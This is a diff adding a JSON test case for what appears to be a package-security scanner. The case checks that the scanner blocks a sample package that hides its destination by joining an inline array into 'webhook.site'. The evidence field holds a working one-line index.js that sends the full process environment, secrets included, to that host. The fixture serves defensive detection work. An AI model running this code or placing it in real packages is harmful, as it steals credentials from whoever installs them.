@@ -1,0 +1,12 @@
+{
+  "name": "arrayjoin-domain-env-exfil",
+  "expect": "block",
+  "expectFinding": "network-exfil-or-loader",
+  "note": "Env-harvest exfil that hides its C2 host by assembling it from an INLINE array literal joined at runtime (`['web','hook','.si','te'].join('')` -> webhook.site). The de-obfuscation normalizer already folds `+`-concat, template fragments, base64, String.fromCharCode and string reversal, but the inline-array-join form slipped through and DOWNGRADED this block to review. resolveArrayJoins now folds `[<string literals>].join(sep)` (bare/empty/`.`-separated) to the assembled literal so the domain becomes visible and the env-harvest->exfil HIGH fires. A runtime array (`[a,host].join('')`) or non-literal separator is left untouched.",
+  "evidence": {
+    "packageName": "arrayjoin-exfil",
+    "sourceFiles": {
+      "index.js": "const host=['web','hook','.si','te'].join('');const env=process['env'];fetch('https://'+host+'/collect',{method:'POST',body:JSON.stringify(env)});"
+    }
+  }
+}
